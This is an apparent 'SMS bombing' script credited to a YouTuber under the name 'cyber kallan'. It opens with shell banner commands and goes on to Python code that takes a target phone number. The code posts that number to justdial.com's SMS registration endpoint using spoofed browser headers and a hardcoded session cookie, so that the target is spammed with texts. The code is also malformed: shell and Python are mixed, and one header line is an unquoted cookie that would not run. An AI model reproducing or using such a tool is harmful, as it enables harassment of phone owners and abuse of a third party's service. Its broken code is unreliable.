
clear
sleep 2
toilet -f future "CYBER KALLAN" | lolcat
sleep 2
clear	

import requests

print("\nSms bombing sytem by cyber kallan")
print("coded by Arjun arz (mallu youtuber) \n")
to = raw_input('to: ')



user_agent = ':Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'
sess = requests.Session()
email_req = sess.post('http://accounts.justdial.com/hr_dashboard_services/jdtest/sendsms_registration', headers={
	'Host': 'accounts.justdial.com',
	'User-Agent': user_agent,
	'Accept': 'application/json, text/javascript, */*; q=0.01',
	'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',
	Cookie:PHPSESSID=9ov0jkdfs1k3ipph0pi3nb9aa4
	'Accept-Encoding': 'gzip, deflate',
	'Referer': 'http://accounts.justdial.com/hr_dashboard_services/jdtest/register?mobile=NzYyMTA1Nzk0MQ==&id=MC4zMTU5MDkwMCAxNTY4NzAxODUyfEB8K%2FlonurGfX0%3D&city=',
        'Connection': 'close',
        'Upgrade-Insecure-Requests':'1',
        'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'
}, data={
	'to': to,
	
	
})

if 'The sms has been sended successfully' in email_req.text:
    print("[+] SMS Sent!")
    print("[+] In order to increase your privacy, the cyber kallan spam system will be randomly delayed up to 10 minutes")

